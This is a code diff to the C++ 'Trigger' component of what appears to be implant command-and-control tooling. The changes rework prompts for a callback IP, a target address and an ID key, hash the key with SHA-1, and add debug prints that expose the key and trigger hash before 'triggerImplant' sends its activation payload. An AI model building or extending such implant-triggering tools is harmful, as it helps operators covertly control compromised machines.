@@ -33,6 +33,9 @@ extern "C"
 	int trigger_dns_query (Payload *p, trigger_info *ti);
 	unsigned int trigger_raw (Payload *p, trigger_info *ti);
 	int trigger_info_to_payload( Payload * p, trigger_info * ti);
+
+	void displaySha1Hash(char *label, unsigned char *sha1Hash);
+
 }
 
 using namespace InterfaceLibrary;
@@ -215,15 +218,14 @@ int Trigger::parse_prompt_config_file( std::string triggerFileName, params *t_pa
 	if (triggerFile.fail())
 	{
 		//  The requested File does not exist, so we will prompt the user for input values and create it...
-		cout << "\n WARNING: The requested file [" << triggerFileName <<"] could not be opened so we will attempt to create a new one with the same name.\n" << endl;
-		cout << "\nWhen the ID key is requested, enter a key between " << ID_KEY_LENGTH_MIN << " and " << MAX_INPUT_LEN << " characters in length."<< endl;
-		cout << "To enter the key from a file, hit return and then enter the file name.\n" << endl;
-
+		cout << "\nTarget profile not found, generating a new one...\n\n";
 		//Create new triggerFile
 		newTriggerFile.open(triggerFileName.c_str());
 
 		if (!newTriggerFile.fail())
 		{
+			cin.width(MAX_INPUT_LEN);
+
 			cout << " Callback IP address? ";
 			cin >> t_param->callbackAddress;
 			newTriggerFile << t_param->callbackAddress;
@@ -241,27 +243,27 @@ int Trigger::parse_prompt_config_file( std::string triggerFileName, params *t_pa
 			newTriggerFile << t_param->targetAddress;
 			newTriggerFile << '|';
 
-			do { // Request an ID key until a valid key is entered or program terminated
-				cout << " ID Key ? ";
+			do { // Request an ID key or filename until a valid entry results
+				cout << " ID Key or filename? ";
 				cin >> t_param->idKey;
-				if (strlen(t_param->idKey) == 0) {
-					cout << "ID Key Filename ? ";
-					cin >> t_param->idKeyFilename;
-					if (access(t_param->idKeyFilename, R_OK)) {
-						perror("Unable to access ID key file.\n");
+				if (access(t_param->idKey, R_OK)) {
+					// Using ID Key
+					if (strlen(t_param->idKey) < ID_KEY_LENGTH_MIN) {
+						cout << "ID Key length too short (must be at least " << ID_KEY_LENGTH_MIN << " characters)\n" << endl;
 						continue;
 					}
-					newTriggerFile << '|';
-					newTriggerFile << t_param->idKeyFilename;
-					newTriggerFile << '|';
+					newTriggerFile << t_param->idKey;
+					newTriggerFile << "||";
 					break;
 				}
-				if (strlen(t_param->idKey) < ID_KEY_LENGTH_MIN) {
-					cout << "ID Key length too short (must be at least " << ID_KEY_LENGTH_MIN << " characters)\n" << endl;
-					continue;
-				}
-				newTriggerFile << t_param->idKey;
-				newTriggerFile << '|';	newTriggerFile << '|';
+
+				// Using ID Key File
+				cout << "   ID key file found.\n";
+				memcpy(t_param->idKeyFilename, t_param->idKey, sizeof(t_param->idKeyFilename));
+				(t_param->idKey)[0] = '\0';
+				newTriggerFile << "|";
+				newTriggerFile << t_param->idKeyFilename;
+				newTriggerFile << "|";
 				break;
 			} while (1);
 
@@ -294,13 +296,13 @@ int Trigger::parse_prompt_config_file( std::string triggerFileName, params *t_pa
 			return -1;
 		}
 		newTriggerFile.close();
+	} else {
+		cout << "\nUsing existing target profile.\n";
+		triggerFile.close();
 	}
-	
-	triggerFile.close();
 
    //Let's read the inputFile and check it's input variables...
 	triggerFile.open(triggerFileName.c_str());
-
 	if (triggerFile.fail())
 	{
 		//Failed to open the file again
@@ -314,7 +316,7 @@ int Trigger::parse_prompt_config_file( std::string triggerFileName, params *t_pa
 
 		//Get and verify callbackAddress
 		triggerFile.getline( t_param->callbackAddress, MAX_INPUT_LEN, delim);
-
+cout << "DEBUG: " << t_param->callbackAddress << endl;
 		if (inet_pton( AF_INET, t_param->callbackAddress, &testSocket.sin_addr) != 1)
 		{
 			cout << " ERROR: Callback IP address [" << t_param->callbackAddress << "] invalid." << endl;
@@ -323,6 +325,7 @@ int Trigger::parse_prompt_config_file( std::string triggerFileName, params *t_pa
 
 		//Get and verify callbackPort
 		triggerFile.getline( tempInput, MAX_INPUT_LEN, delim);
+cout << "DEBUG: " << tempInput << endl;
 		t_param->callbackPort = atoi( tempInput);
 
 		if (( t_param->callbackPort > 65535) || ( t_param->callbackPort <= 0))
@@ -336,6 +339,7 @@ int Trigger::parse_prompt_config_file( std::string triggerFileName, params *t_pa
 
 		//Get and verify targetAddress
 		triggerFile.getline( t_param->targetAddress, MAX_INPUT_LEN, delim);
+cout << "DEBUG: " << t_param->targetAddress << endl;
 
 		if (inet_pton( AF_INET, t_param->targetAddress, &testSocket.sin_addr) != 1)
 		{
@@ -346,8 +350,10 @@ int Trigger::parse_prompt_config_file( std::string triggerFileName, params *t_pa
 		// Get and verify ID key
 
 		triggerFile.getline( t_param->idKey, MAX_INPUT_LEN, delim);
+cout << "DEBUG: idKey = " << t_param->idKey << endl;
 		if (strlen(t_param->idKey) == 0) {
 			triggerFile.getline( t_param->idKeyFilename, MAX_INPUT_LEN, delim);
+cout << "DEBUG: idKeyFilename = " << t_param->idKeyFilename << endl;
 			if (strlen(t_param->idKeyFilename) == 0) {
 				cout << "ERROR: Missing ID key." << endl;
 				return -1;
@@ -356,12 +362,14 @@ int Trigger::parse_prompt_config_file( std::string triggerFileName, params *t_pa
 				perror("Unable to access ID key file.\n");
 				return -1;
 			}
-		} else
-			triggerFile.getline( t_param->idKeyFilename, MAX_INPUT_LEN, delim); // Skip over the blank field
-
-		if (strlen(t_param->idKey) < ID_KEY_LENGTH_MIN) {
-			cout << "ID Key length too short (must be at least " << ID_KEY_LENGTH_MIN << " characters)\n" << endl;
-			return -1;
+		} else {
+			if (strlen(t_param->idKey) < ID_KEY_LENGTH_MIN) {
+cout << "DEBUG: idKey length = " << strlen(t_param->idKey) << endl;
+				cout << "ID Key length too short (must be at least " << ID_KEY_LENGTH_MIN << " characters)\n" << endl;
+				return -1;
+			}
+			t_param->idKeyFilename[0] = '\0';	// Null terminate the filename field.
+			triggerFile.ignore(1);			// Skip over the blank field
 		}
 
 		//Get and verify protocolType 
@@ -548,16 +556,17 @@ void Trigger::triggerImplant( Primitive::Activation& actvn, ProcessCmdAccumulato
 	inet_pton( AF_INET, t_param.targetAddress, &(ti.target_addr));
 
 	// Read and process ID key
-
-	if (strlen(t_param.idKeyFilename)) {
+cout << "DEBUG: Key file \"" << t_param.idKeyFilename << "\".\n";
+cout << "DEBUG: Key filename length \"" << strlen(t_param.idKeyFilename) << "\".\n";
+	if (strlen(t_param.idKeyFilename) > 0) {
 		if (sha1_file(t_param.idKeyFilename, ti.triggerKey) != 0) {
-			cout << "ERROR: Could not generate trigger key from key file." << endl;
+			cout << "ERROR: Could not generate trigger key from key file \"" << t_param.idKeyFilename << "\".\n";
 			return;
 		}
 	} else {
 		sha1((const unsigned char *)t_param.idKey, strlen(t_param.idKey), ti.triggerKey);
 	}
-
+	displaySha1Hash("Trigger key: ", ti.triggerKey);
 
    //------------Payload----------------
 	memset( &p, 0, sizeof( Payload ) );
@@ -661,3 +670,19 @@ void Trigger::triggerImplant( Primitive::Activation& actvn, ProcessCmdAccumulato
 
 	return;
 };
+
+
+//define displaySha1Hash function
+void displaySha1Hash(char *label, unsigned char *sha1Hash)
+{
+	int i=0;
+
+	//Display Label
+	printf( " DEBUG: %s=[", label );
+
+	//Display 40 hexadecimal number array
+	for (i=0; i < ID_KEY_HASH_SIZE; i++)
+		printf("%02x",sha1Hash[i]);
+	printf( "]\n" );
+}
+
